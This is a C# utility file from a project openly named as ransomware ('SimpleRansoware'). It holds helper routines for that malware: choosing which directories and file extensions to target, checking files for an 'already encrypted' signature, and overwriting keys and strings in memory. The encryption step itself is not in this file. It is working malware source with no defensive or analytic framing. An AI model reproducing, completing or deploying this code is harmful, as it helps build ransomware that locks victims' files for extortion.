using System;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

namespace SimpleRansoware
{
    /// <summary>
    /// Common Stufs
    /// </summary>
    public sealed class Common
    {
        private Common() { }

        /// <summary>
        /// Global Randomizer
        /// </summary>
        public static readonly Random random = new Random();

        /// <summary>
        /// Clear Array Content from Memory
        /// </summary>
        /// <param name="array"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static void ClearArray(ref byte[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)random.Next(0, 255);
            }
        }

        /// <summary>
        /// Clear String Content from Memory
        /// </summary>
        /// <param name="array"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static unsafe void ClearString(ref string str)
        {
            if (str == null) { return; }

            int strLen = str.Length;

            fixed (char* ptr = str)
            {
                for (int i = 0; i < strLen; i++)
                {
                    ptr[i] = (char)random.Next(0, 255);
                }
            }
        }

        /// <summary>
        /// Open a Secure String
        /// </summary>
        /// <param name="dest"></param>
        /// <param name="source"></param>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
       public static void OpenSecureString(ref String dest, ref SecureString source)
        {
            IntPtr unmanagedString = IntPtr.Zero;
            try
            {
                unmanagedString = Marshal.SecureStringToGlobalAllocUnicode(source);
                dest = Marshal.PtrToStringUni(unmanagedString);
            }
            finally
            {
                Marshal.ZeroFreeGlobalAllocUnicode(unmanagedString);
            }
        }


        /// <summary>
        /// Check File Signature VS Encripted File Signature
        /// </summary>
        /// <param name="info"></param>
        /// <returns></returns>
        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public static Boolean CheckSignature(FileInfo file)
        {
            Boolean result = true;

            using (FileStream fs = File.OpenRead(file.FullName))
            {
                byte[] bData = new byte[ConfigurationManager.FILE_SIGNATURE_SIZE];
                fs.Read(bData, 0, bData.Length);

                // Compare
                for (int i = 0; i < ConfigurationManager.FILE_SIGNATURE_SIZE; i++)
                {
                    if (!(bData[i] == ConfigurationManager.FILE_SIGNATURE[i]))
                    {
                        result = false;
                        break;
                    }
                }
            }

            return result;
        }


        /// <summary>
        /// Check if a Path is in a Global Filter
        /// </summary>
        /// <param name="fullName"></param>
        /// <returns></returns>
        public static bool DirectoryInFilter(string fullName)
        {
            // Basic Override
            if (ConfigurationManager.TARGET_PATH_FILTER == null) { return true; }

            String normalizedPath = fullName.ToUpper(CultureInfo.CurrentCulture);

            foreach (String item in ConfigurationManager.TARGET_PATH_FILTER)
            {
                if (normalizedPath.Contains(item))
                {
                    return true;
                }
            }

            return false;
        }


        /// <summary>
        /// Check if a Path is in a Global Filter
        /// </summary>
        /// <param name="fullName"></param>
        /// <returns></returns>
        public static bool FileInFilter(string fileExtension)
        {
            string normalizedExtension = fileExtension.ToUpper(CultureInfo.CurrentCulture);

            foreach (string item in ConfigurationManager.TARGET_FILES)
            {
                if (normalizedExtension == item)
                {
                    return true;
                }
            }

            return false;
        }



    }
}
